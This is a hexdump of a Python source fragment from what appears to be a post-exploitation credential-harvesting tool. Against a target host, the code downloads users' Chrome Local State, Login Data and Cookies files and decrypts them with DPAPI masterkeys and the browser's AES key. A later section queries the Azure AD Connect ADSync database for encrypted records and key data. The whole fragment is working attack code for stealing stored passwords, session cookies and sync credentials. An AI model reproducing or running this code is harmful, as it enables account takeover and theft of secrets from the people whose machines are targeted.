-00004cb0: 7265 6374 6f72 7920 3d20 7365 6c66 2e6d  rectory = self.m
-00004cc0: 7966 696c 656f 7073 2e64 6f5f 6c73 2874  yfileops.do_ls(t
-00004cd0: 6d70 5f70 7764 2c20 6d79 5f6d 6173 6b2c  mp_pwd, my_mask,
-00004ce0: 2064 6973 706c 6179 3d46 616c 7365 290a   display=False).
-00004cf0: 0909 0909 666f 7220 696e 666f 7320 696e  ....for infos in
-00004d00: 206d 795f 6469 7265 6374 6f72 793a 0a09   my_directory:..
-00004d10: 0909 0909 6c6f 6e67 6e61 6d65 2c20 6973  ....longname, is
-00004d20: 5f64 6972 6563 746f 7279 203d 2069 6e66  _directory = inf
-00004d30: 6f73 0a09 0909 0909 7365 6c66 2e6c 6f67  os......self.log
-00004d40: 6769 6e67 2e64 6562 7567 2822 6c73 2072  ging.debug("ls r
-00004d50: 6574 7572 6e65 6420 6669 6c65 2025 7322  eturned file %s"
-00004d60: 2025 206c 6f6e 676e 616d 6529 0a09 0909   % longname)....
-00004d70: 0909 6966 206c 6f6e 676e 616d 6520 6e6f  ..if longname no
-00004d80: 7420 696e 2062 6c61 636b 6c69 7374 2061  t in blacklist a
-00004d90: 6e64 206e 6f74 2069 735f 6469 7265 6374  nd not is_direct
-00004da0: 6f72 793a 0a09 0909 0909 0974 7279 3a0a  ory:.......try:.
-00004db0: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-00004dc0: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
-00004dd0: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
-00004de0: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
-00004df0: 5b2b 5d20 466f 756e 6420 7b62 636f 6c6f  [+] Found {bcolo
-00004e00: 7273 2e4f 4b42 4c55 457d 7b75 7365 722e  rs.OKBLUE}{user.
-00004e10: 7573 6572 6e61 6d65 7d7b 6263 6f6c 6f72  username}{bcolor
-00004e20: 732e 454e 4443 7d20 4368 726f 6d65 2066  s.ENDC} Chrome f
-00004e30: 696c 6573 203a 207b 6c6f 6e67 6e61 6d65  iles : {longname
-00004e40: 7d22 290a 0909 0909 0909 0923 2044 6f77  }")........# Dow
-00004e50: 6e6c 6f61 6469 6e67 2042 6c6f 6220 6669  nloading Blob fi
-00004e60: 6c65 0a09 0909 0909 0909 6c6f 6361 6c66  le........localf
-00004e70: 696c 6520 3d20 7365 6c66 2e6d 7966 696c  ile = self.myfil
-00004e80: 656f 7073 2e67 6574 5f66 696c 6528 6e74  eops.get_file(nt
-00004e90: 7061 7468 2e6a 6f69 6e28 746d 705f 7077  path.join(tmp_pw
-00004ea0: 642c 206c 6f6e 676e 616d 6529 2c20 616c  d, longname), al
-00004eb0: 6c6f 775f 6163 6365 7373 5f65 7272 6f72  low_access_error
-00004ec0: 3d54 7275 6529 0a09 0909 0909 0909 2320  =True)........# 
-00004ed0: 6d79 6f70 7469 6f6e 7320 3d20 636f 7079  myoptions = copy
-00004ee0: 2e64 6565 7063 6f70 7928 7365 6c66 2e6f  .deepcopy(self.o
-00004ef0: 7074 696f 6e73 290a 0909 0909 0909 0969  ptions)........i
-00004f00: 6620 6d79 5f62 6c6f 625f 7479 7065 203d  f my_blob_type =
-00004f10: 3d20 2743 6872 6f6d 654c 6f63 616c 5374  = 'ChromeLocalSt
-00004f20: 6174 6527 3a0a 0909 0909 0909 0909 7472  ate':.........tr
-00004f30: 793a 0a09 0909 0909 0909 0909 6d79 4368  y:..........myCh
-00004f40: 726f 6d65 5365 6372 6574 732e 6c6f 6361  romeSecrets.loca
-00004f50: 6c73 7461 7465 5f70 6174 6820 3d20 6c6f  lstate_path = lo
-00004f60: 6361 6c66 696c 650a 0909 0909 0909 0909  calfile.........
-00004f70: 0967 7569 6420 3d20 6d79 4368 726f 6d65  .guid = myChrome
-00004f80: 5365 6372 6574 732e 6765 745f 6d61 7374  Secrets.get_mast
-00004f90: 6572 6b65 795f 6775 6964 5f66 726f 6d5f  erkey_guid_from_
-00004fa0: 6c6f 6361 6c73 7461 7465 2829 0a09 0909  localstate()....
-00004fb0: 0909 0909 0909 6966 2067 7569 6420 213d  ......if guid !=
-00004fc0: 204e 6f6e 653a 0a09 0909 0909 0909 0909   None:..........
-00004fd0: 096d 6173 7465 726b 6579 203d 2073 656c  .masterkey = sel
-00004fe0: 662e 6765 745f 6d61 7374 6572 6b65 7928  f.get_masterkey(
-00004ff0: 7573 6572 3d75 7365 722c 2067 7569 643d  user=user, guid=
-00005000: 6775 6964 2c20 7479 7065 3d6d 795f 7573  guid, type=my_us
-00005010: 6572 5f74 7970 6529 0a09 0909 0909 0909  er_type)........
-00005020: 0909 0969 6620 6d61 7374 6572 6b65 7920  ...if masterkey 
-00005030: 213d 204e 6f6e 653a 0a09 0909 0909 0909  != None:........
-00005040: 0909 0909 6966 206d 6173 7465 726b 6579  ....if masterkey
-00005050: 5b27 7374 6174 7573 275d 203d 3d20 2764  ['status'] == 'd
-00005060: 6563 7279 7074 6564 273a 0a09 0909 0909  ecrypted':......
-00005070: 0909 0909 0909 096d 7943 6872 6f6d 6553  .......myChromeS
-00005080: 6563 7265 7473 2e6d 6173 7465 726b 6579  ecrets.masterkey
-00005090: 203d 206d 6173 7465 726b 6579 5b27 6b65   = masterkey['ke
-000050a0: 7927 5d0a 0909 0909 0909 0909 0909 0909  y'].............
-000050b0: 6165 734b 6579 203d 206d 7943 6872 6f6d  aesKey = myChrom
-000050c0: 6553 6563 7265 7473 2e67 6574 5f41 4553  eSecrets.get_AES
-000050d0: 5f6b 6579 5f66 726f 6d5f 6c6f 6361 6c73  _key_from_locals
-000050e0: 7461 7465 280a 0909 0909 0909 0909 0909  tate(...........
-000050f0: 0909 096d 6173 7465 726b 6579 3d6d 6173  ...masterkey=mas
-00005100: 7465 726b 6579 5b27 6b65 7927 5d29 0a09  terkey['key'])..
-00005110: 0909 0909 0909 0909 0909 0969 6620 6165  ...........if ae
-00005120: 734b 6579 2021 3d20 4e6f 6e65 3a0a 0909  sKey != None:...
-00005130: 0909 0909 0909 0909 0909 0973 656c 662e  ...........self.
-00005140: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-00005150: 0909 0909 0909 0909 0909 0909 0966 225b  .............f"[
-00005160: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-00005170: 7267 6574 5f69 707d 5d20 7b62 636f 6c6f  rget_ip}] {bcolo
-00005180: 7273 2e4f 4b47 5245 454e 7d44 6563 7279  rs.OKGREEN}Decry
-00005190: 7074 696f 6e20 7375 6363 6573 7366 756c  ption successful
-000051a0: 6c20 6f66 207b 6263 6f6c 6f72 732e 4f4b  l of {bcolors.OK
-000051b0: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
-000051c0: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
-000051d0: 437d 2043 6872 6f6d 6520 4145 5320 4b65  C} Chrome AES Ke
-000051e0: 7920 7b61 6573 4b65 797d 207b 6263 6f6c  y {aesKey} {bcol
-000051f0: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
-00005200: 0909 0909 0909 0909 656c 7365 3a0a 0909  ........else:...
-00005210: 0909 0909 0909 0909 0909 0973 656c 662e  ...........self.
-00005220: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-00005230: 0909 0909 0909 0909 0909 0909 0966 225b  .............f"[
-00005240: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-00005250: 7267 6574 5f69 707d 5d20 7b62 636f 6c6f  rget_ip}] {bcolo
-00005260: 7273 2e57 4152 4e49 4e47 7d45 7272 6f72  rs.WARNING}Error
-00005270: 2064 6563 7279 7074 696e 6720 4145 5320   decrypting AES 
-00005280: 4b65 7920 666f 7220 4368 726f 6d65 204c  Key for Chrome L
-00005290: 6f63 616c 2053 7461 7465 2077 6974 6820  ocal State with 
-000052a0: 4d61 7374 6572 6b65 797b 6263 6f6c 6f72  Masterkey{bcolor
-000052b0: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
-000052c0: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
-000052d0: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-000052e0: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
-000052f0: 0909 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
-00005300: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00005310: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
-00005320: 524e 494e 477d 4572 726f 7220 6465 6372  RNING}Error decr
-00005330: 7970 7469 6e67 2041 4553 204b 6579 2066  ypting AES Key f
-00005340: 6f72 2043 6872 6f6d 6520 4c6f 6361 6c20  or Chrome Local 
-00005350: 5374 6174 6520 202d 204d 6173 7465 726b  State  - Masterk
-00005360: 6579 206e 6f74 2064 6563 7279 7074 6564  ey not decrypted
-00005370: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
-00005380: 0a09 0909 0909 0909 0909 0965 6c73 653a  ...........else:
-00005390: 0a09 0909 0909 0909 0909 0909 7365 6c66  ............self
-000053a0: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
-000053b0: 0909 0909 0909 0909 0909 0909 6622 5b7b  ............f"[{
-000053c0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-000053d0: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-000053e0: 732e 5741 524e 494e 477d 4572 726f 7220  s.WARNING}Error 
-000053f0: 6465 6372 7970 7469 6e67 2041 4553 204b  decrypting AES K
-00005400: 6579 2066 6f72 2043 6872 6f6d 6520 4c6f  ey for Chrome Lo
-00005410: 6361 6c20 5374 6174 6520 7769 7468 204d  cal State with M
-00005420: 6173 7465 726b 6579 2d20 6361 6e74 2067  asterkey- cant g
-00005430: 6574 206d 6173 7465 726b 6579 207b 6775  et masterkey {gu
-00005440: 6964 7d7b 6263 6f6c 6f72 732e 454e 4443  id}{bcolors.ENDC
-00005450: 7d22 290a 0909 0909 0909 0909 0965 6c73  }")..........els
-00005460: 653a 0a09 0909 0909 0909 0909 0973 656c  e:...........sel
-00005470: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00005480: 0a09 0909 0909 0909 0909 0909 6622 5b7b  ............f"[{
-00005490: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-000054a0: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-000054b0: 732e 5741 524e 494e 477d 4572 726f 7220  s.WARNING}Error 
-000054c0: 6465 6372 7970 7469 6e67 2041 4553 204b  decrypting AES K
-000054d0: 6579 2066 6f72 2043 6872 6f6d 6520 4c6f  ey for Chrome Lo
-000054e0: 6361 6c20 5374 6174 6520 7769 7468 204d  cal State with M
-000054f0: 6173 7465 726b 6579 202d 2063 616e 2074  asterkey - can t
-00005500: 2067 6574 2074 6865 2047 5549 4420 6f66   get the GUID of
-00005510: 206d 6173 7465 726b 6579 2066 726f 6d20   masterkey from 
-00005520: 626c 6f62 2066 696c 657b 6263 6f6c 6f72  blob file{bcolor
-00005530: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
-00005540: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
-00005550: 6f6e 2061 7320 6578 3a0a 0909 0909 0909  on as ex:.......
-00005560: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-00005570: 6465 6275 6728 0a09 0909 0909 0909 0909  debug(..........
-00005580: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
-00005590: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
-000055a0: 636f 6c6f 7273 2e57 4152 4e49 4e47 7d45  colors.WARNING}E
-000055b0: 7863 6570 7469 6f6e 2069 6e20 4368 726f  xception in Chro
-000055c0: 6d65 4c6f 6361 6c53 7461 7465 7b62 636f  meLocalState{bco
-000055d0: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-000055e0: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
-000055f0: 6e67 2e64 6562 7567 2865 7829 0a09 0909  ng.debug(ex)....
-00005600: 0909 0909 6966 206d 795f 626c 6f62 5f74  ....if my_blob_t
-00005610: 7970 6520 3d3d 2027 4368 726f 6d65 4c6f  ype == 'ChromeLo
-00005620: 6769 6e44 6174 6127 3a0a 0909 0909 0909  ginData':.......
-00005630: 0909 7472 793a 0a09 0909 0909 0909 0909  ..try:..........
-00005640: 6d79 4368 726f 6d65 5365 6372 6574 732e  myChromeSecrets.
-00005650: 6c6f 6769 6e64 6174 615f 7061 7468 203d  logindata_path =
-00005660: 206c 6f63 616c 6669 6c65 0a09 0909 0909   localfile......
-00005670: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
-00005680: 6f6e 676e 616d 655d 203d 207b 7d0a 0909  ongname] = {}...
-00005690: 0909 0909 0909 0975 7365 722e 6669 6c65  .......user.file
-000056a0: 735b 6c6f 6e67 6e61 6d65 5d5b 2774 7970  s[longname]['typ
-000056b0: 6527 5d20 3d20 6d79 5f62 6c6f 625f 7479  e'] = my_blob_ty
-000056c0: 7065 0a09 0909 0909 0909 0909 7573 6572  pe..........user
-000056d0: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
-000056e0: 5b27 7374 6174 7573 275d 203d 2027 656e  ['status'] = 'en
-000056f0: 6372 7970 7465 6427 0a09 0909 0909 0909  crypted'........
-00005700: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
-00005710: 676e 616d 655d 5b27 7061 7468 275d 203d  gname]['path'] =
-00005720: 206c 6f63 616c 6669 6c65 0a09 0909 0909   localfile......
-00005730: 0909 0909 6c6f 6769 6e73 203d 206d 7943  ....logins = myC
-00005740: 6872 6f6d 6553 6563 7265 7473 2e64 6563  hromeSecrets.dec
-00005750: 7279 7074 5f63 6872 6f6d 655f 4c6f 6769  rypt_chrome_Logi
-00005760: 6e44 6174 6128 290a 0909 0909 0909 0909  nData().........
-00005770: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
-00005780: 6e61 6d65 5d5b 2773 6563 7265 7427 5d20  name]['secret'] 
-00005790: 3d20 6c6f 6769 6e73 0a09 0909 0909 0909  = logins........
-000057a0: 0909 6966 206c 6f67 696e 7320 6973 206e  ..if logins is n
-000057b0: 6f74 204e 6f6e 653a 0a09 0909 0909 0909  ot None:........
-000057c0: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
-000057d0: 6e67 6e61 6d65 5d5b 2773 7461 7475 7327  ngname]['status'
-000057e0: 5d20 3d20 2764 6563 7279 7074 6564 270a  ] = 'decrypted'.
-000057f0: 0909 0909 0909 0909 6578 6365 7074 2045  ........except E
-00005800: 7863 6570 7469 6f6e 2061 7320 6578 3a0a  xception as ex:.
-00005810: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
-00005820: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-00005830: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00005840: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00005850: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
-00005860: 4e49 4e47 7d45 7863 6570 7469 6f6e 2064  NING}Exception d
-00005870: 6563 7279 7074 696e 6720 6c6f 6769 6e64  ecrypting logind
-00005880: 6174 6120 666f 7220 4348 524f 4d45 207b  ata for CHROME {
-00005890: 7573 6572 2e75 7365 726e 616d 657d 207b  user.username} {
-000058a0: 6c6f 6361 6c66 696c 657d 207b 6263 6f6c  localfile} {bcol
-000058b0: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
-000058c0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-000058d0: 672e 6465 6275 6728 6578 290a 0909 0909  g.debug(ex).....
-000058e0: 0909 0969 6620 6d79 5f62 6c6f 625f 7479  ...if my_blob_ty
-000058f0: 7065 203d 3d20 2743 6872 6f6d 6543 6f6f  pe == 'ChromeCoo
-00005900: 6b69 6573 273a 0a09 0909 0909 0909 0974  kies':.........t
-00005910: 7279 3a0a 0909 0909 0909 0909 096d 7943  ry:..........myC
-00005920: 6872 6f6d 6553 6563 7265 7473 2e63 6f6f  hromeSecrets.coo
-00005930: 6b69 655f 7061 7468 203d 206c 6f63 616c  kie_path = local
-00005940: 6669 6c65 0a09 0909 0909 0909 0909 7573  file..........us
-00005950: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
-00005960: 655d 203d 207b 7d0a 0909 0909 0909 0909  e] = {}.........
-00005970: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
-00005980: 6e61 6d65 5d5b 2774 7970 6527 5d20 3d20  name]['type'] = 
-00005990: 6d79 5f62 6c6f 625f 7479 7065 0a09 0909  my_blob_type....
-000059a0: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
-000059b0: 5b6c 6f6e 676e 616d 655d 5b27 7374 6174  [longname]['stat
-000059c0: 7573 275d 203d 2027 656e 6372 7970 7465  us'] = 'encrypte
-000059d0: 6427 0a09 0909 0909 0909 0909 7573 6572  d'..........user
-000059e0: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
-000059f0: 5b27 7061 7468 275d 203d 206c 6f63 616c  ['path'] = local
-00005a00: 6669 6c65 0a09 0909 0909 0909 0909 636f  file..........co
-00005a10: 6f6b 6965 7320 3d20 6d79 4368 726f 6d65  okies = myChrome
-00005a20: 5365 6372 6574 732e 6465 6372 7970 745f  Secrets.decrypt_
-00005a30: 6368 726f 6d65 5f43 6f6f 6b69 6544 6174  chrome_CookieDat
-00005a40: 6128 290a 0909 0909 0909 0909 0975 7365  a()..........use
-00005a50: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-00005a60: 5d5b 2773 6563 7265 7427 5d20 3d20 636f  ]['secret'] = co
-00005a70: 6f6b 6965 730a 0909 0909 0909 0909 0969  okies..........i
-00005a80: 6620 636f 6f6b 6965 7320 6973 206e 6f74  f cookies is not
-00005a90: 204e 6f6e 653a 0a09 0909 0909 0909 0909   None:..........
-00005aa0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
-00005ab0: 6e61 6d65 5d5b 2773 7461 7475 7327 5d20  name]['status'] 
-00005ac0: 3d20 2764 6563 7279 7074 6564 270a 0909  = 'decrypted'...
-00005ad0: 0909 0909 0909 6578 6365 7074 2045 7863  ......except Exc
-00005ae0: 6570 7469 6f6e 2061 7320 6578 3a0a 0909  eption as ex:...
-00005af0: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-00005b00: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
-00005b10: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-00005b20: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-00005b30: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
-00005b40: 4e47 7d45 7863 6570 7469 6f6e 2064 6563  NG}Exception dec
-00005b50: 7279 7074 696e 6720 436f 6f6b 6965 4461  rypting CookieDa
-00005b60: 7461 2066 6f72 2043 4852 4f4d 4520 7b75  ta for CHROME {u
-00005b70: 7365 722e 7573 6572 6e61 6d65 7d20 7b6c  ser.username} {l
-00005b80: 6f63 616c 6669 6c65 7d20 7b62 636f 6c6f  ocalfile} {bcolo
-00005b90: 7273 2e45 4e44 437d 2229 0a09 0909 0909  rs.ENDC}")......
-00005ba0: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-00005bb0: 2e64 6562 7567 2865 7829 0a09 0909 0909  .debug(ex)......
-00005bc0: 0909 6966 206d 795f 626c 6f62 5f74 7970  ..if my_blob_typ
-00005bd0: 6520 3d3d 2027 4368 726f 6d65 5665 7273  e == 'ChromeVers
-00005be0: 696f 6e27 3a0a 0909 0909 0909 0909 7472  ion':.........tr
-00005bf0: 793a 0a09 0909 0909 0909 0909 6d79 4368  y:..........myCh
-00005c00: 726f 6d65 5365 6372 6574 732e 7665 7273  romeSecrets.vers
-00005c10: 696f 6e5f 7061 7468 203d 206c 6f63 616c  ion_path = local
-00005c20: 6669 6c65 0a09 0909 0909 0909 0909 7573  file..........us
-00005c30: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
-00005c40: 655d 203d 207b 7d0a 0909 0909 0909 0909  e] = {}.........
-00005c50: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
-00005c60: 6e61 6d65 5d5b 2774 7970 6527 5d20 3d20  name]['type'] = 
-00005c70: 6d79 5f62 6c6f 625f 7479 7065 0a09 0909  my_blob_type....
-00005c80: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
-00005c90: 5b6c 6f6e 676e 616d 655d 5b27 7374 6174  [longname]['stat
-00005ca0: 7573 275d 203d 2027 656e 6372 7970 7465  us'] = 'encrypte
-00005cb0: 6427 0a09 0909 0909 0909 0909 7573 6572  d'..........user
-00005cc0: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
-00005cd0: 5b27 7061 7468 275d 203d 206c 6f63 616c  ['path'] = local
-00005ce0: 6669 6c65 0a09 0909 0909 0909 0909 636f  file..........co
-00005cf0: 6f6b 6965 7320 3d20 6d79 4368 726f 6d65  okies = myChrome
-00005d00: 5365 6372 6574 732e 6765 745f 6368 726f  Secrets.get_chro
-00005d10: 6d65 5f56 6572 7369 6f6e 2829 0a09 0909  me_Version()....
-00005d20: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
-00005d30: 5b6c 6f6e 676e 616d 655d 5b27 7365 6372  [longname]['secr
-00005d40: 6574 275d 203d 2063 6f6f 6b69 6573 0a09  et'] = cookies..
-00005d50: 0909 0909 0909 0909 6966 2063 6f6f 6b69  ........if cooki
-00005d60: 6573 2069 7320 6e6f 7420 4e6f 6e65 3a0a  es is not None:.
-00005d70: 0909 0909 0909 0909 0909 7573 6572 2e66  ..........user.f
-00005d80: 696c 6573 5b6c 6f6e 676e 616d 655d 5b27  iles[longname]['
-00005d90: 7374 6174 7573 275d 203d 2027 6465 6372  status'] = 'decr
-00005da0: 7970 7465 6427 0a09 0909 0909 0909 0965  ypted'.........e
-00005db0: 7863 6570 7420 4578 6365 7074 696f 6e20  xcept Exception 
-00005dc0: 6173 2065 783a 0a09 0909 0909 0909 0909  as ex:..........
-00005dd0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-00005de0: 7567 280a 0909 0909 0909 0909 0909 6622  ug(...........f"
-00005df0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00005e00: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
-00005e10: 6f72 732e 5741 524e 494e 477d 4578 6365  ors.WARNING}Exce
-00005e20: 7074 696f 6e20 6465 6372 7970 7469 6e67  ption decrypting
-00005e30: 2043 6f6f 6b69 6544 6174 6120 666f 7220   CookieData for 
-00005e40: 4348 524f 4d45 207b 7573 6572 2e75 7365  CHROME {user.use
-00005e50: 726e 616d 657d 207b 6c6f 6361 6c66 696c  rname} {localfil
-00005e60: 657d 207b 6263 6f6c 6f72 732e 454e 4443  e} {bcolors.ENDC
-00005e70: 7d22 290a 0909 0909 0909 0909 0973 656c  }")..........sel
-00005e80: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00005e90: 6578 290a 0a09 0909 0909 0965 7863 6570  ex)........excep
-00005ea0: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-00005eb0: 783a 0a09 0909 0909 0909 7365 6c66 2e6c  x:........self.l
-00005ec0: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
-00005ed0: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-00005ee0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-00005ef0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
-00005f00: 494e 477d 4578 6365 7074 696f 6e20 6465  ING}Exception de
-00005f10: 6372 7970 7469 6e67 2042 6c6f 6220 666f  crypting Blob fo
-00005f20: 7220 7b6c 6f63 616c 6669 6c65 7d20 7769  r {localfile} wi
-00005f30: 7468 204d 6173 7465 726b 6579 7b62 636f  th Masterkey{bco
-00005f40: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-00005f50: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-00005f60: 2e64 6562 7567 2865 7829 0a0a 0964 6566  .debug(ex)...def
-00005f70: 2067 6574 4d64 6244 6174 6128 7365 6c66   getMdbData(self
-00005f80: 293a 0a09 0974 7279 3a0a 0909 0972 6574  ):...try:....ret
-00005f90: 7572 6e20 7365 6c66 2e67 6574 4d64 6244  urn self.getMdbD
-00005fa0: 6174 6132 2829 0a09 0965 7863 6570 7420  ata2()...except 
-00005fb0: 556e 6963 6f64 6544 6563 6f64 6545 7272  UnicodeDecodeErr
-00005fc0: 6f72 3a0a 0909 0972 6574 7572 6e20 7365  or:....return se
-00005fd0: 6c66 2e67 6574 4d64 6244 6174 6132 2827  lf.getMdbData2('
-00005fe0: 7574 662d 3136 2d6c 6527 290a 0a09 6465  utf-16-le')...de
-00005ff0: 6620 6765 744d 6462 4461 7461 3228 7365  f getMdbData2(se
-00006000: 6c66 2c20 636f 6465 633d 2775 7466 2d38  lf, codec='utf-8
-00006010: 2729 3a0a 0909 7472 793a 0a09 0909 6f75  '):...try:....ou
-00006020: 7420 3d20 7b0a 0909 0909 2763 7279 7074  t = {.....'crypt
-00006030: 6564 7265 636f 7264 7327 3a20 5b5d 2c0a  edrecords': [],.
-00006040: 0909 0909 2778 6d6c 6461 7461 273a 205b  ....'xmldata': [
-00006050: 5d0a 0909 097d 0a09 0909 6b65 7964 6174  ]....}....keydat
-00006060: 6120 3d20 4e6f 6e65 0a09 0909 230a 0909  a = None....#...
-00006070: 0923 2073 656c 662e 6f70 7469 6f6e 732e  .# self.options.
-00006080: 6672 6f6d 5f66 696c 653d 2761 6473 796e  from_file='adsyn
-00006090: 635f 6578 706f 7274 270a 0a09 0909 6966  c_export'.....if
-000060a0: 2073 656c 662e 6f70 7469 6f6e 732e 6672   self.options.fr
-000060b0: 6f6d 5f66 696c 653a 0a09 0909 096c 6f67  om_file:.....log
-000060c0: 6769 6e67 2e69 6e66 6f28 274c 6f61 6469  ging.info('Loadi
-000060d0: 6e67 2063 6f6e 6669 6775 7261 7469 6f6e  ng configuration
-000060e0: 2064 6174 6120 6672 6f6d 2025 7320 6f6e   data from %s on
-000060f0: 2066 696c 6573 7973 7465 6d27 2c20 7365   filesystem', se
-00006100: 6c66 2e6f 7074 696f 6e73 2e66 726f 6d5f  lf.options.from_
-00006110: 6669 6c65 290a 0909 0909 696e 6669 6c65  file).....infile
-00006120: 203d 2063 6f64 6563 732e 6f70 656e 2873   = codecs.open(s
-00006130: 656c 662e 6f70 7469 6f6e 732e 6672 6f6d  elf.options.from
-00006140: 5f66 696c 652c 2027 7227 2c20 636f 6465  _file, 'r', code
-00006150: 6329 0a09 0909 0965 6e75 6d74 6172 6765  c).....enumtarge
-00006160: 7420 3d20 696e 6669 6c65 0a09 0909 656c  t = infile....el
-00006170: 7365 3a0a 0909 0909 6c6f 6767 696e 672e  se:.....logging.
-00006180: 696e 666f 2827 5175 6572 7969 6e67 2064  info('Querying d
-00006190: 6174 6162 6173 6520 666f 7220 636f 6e66  atabase for conf
-000061a0: 6967 7572 6174 696f 6e20 6461 7461 2729  iguration data')
-000061b0: 0a09 0909 0964 6270 6174 6820 3d20 6f73  .....dbpath = os
-000061c0: 2e70 6174 682e 6a6f 696e 286f 732e 6765  .path.join(os.ge
-000061d0: 7463 7764 2829 2c20 7222 4144 5379 6e63  tcwd(), r"ADSync
-000061e0: 2e6d 6466 2229 0a09 0909 096f 7574 7075  .mdf").....outpu
-000061f0: 7420 3d20 7375 6270 726f 6365 7373 2e50  t = subprocess.P
-00006200: 6f70 656e 285b 2241 4453 796e 6351 7565  open(["ADSyncQue
-00006210: 7279 2e65 7865 222c 2064 6270 6174 685d  ry.exe", dbpath]
-00006220: 2c20 7374 646f 7574 3d73 7562 7072 6f63  , stdout=subproc
-00006230: 6573 732e 5049 5045 292e 636f 6d6d 756e  ess.PIPE).commun
-00006240: 6963 6174 6528 295b 305d 0a09 0909 0965  icate()[0].....e
-00006250: 6e75 6d74 6172 6765 7420 3d20 6f75 7470  numtarget = outp
-00006260: 7574 2e73 706c 6974 2827 5c6e 2729 0a0a  ut.split('\n')..
-00006270: 0909 0923 2323 2323 5445 4d50 0a09 0909  ...#####TEMP....
-00006280: 2320 6c6f 6767 696e 672e 696e 666f 2827  # logging.info('
-00006290: 4c6f 6164 696e 6720 636f 6e66 6967 7572  Loading configur
-000062a0: 6174 696f 6e20 6461 7461 2066 726f 6d20  ation data from 
-000062b0: 2573 206f 6e20 6669 6c65 7379 7374 656d  %s on filesystem
-000062c0: 272c 2073 656c 662e 5f5f 6f70 7469 6f6e  ', self.__option
-000062d0: 732e 6672 6f6d 5f66 696c 6529 0a09 0909  s.from_file)....
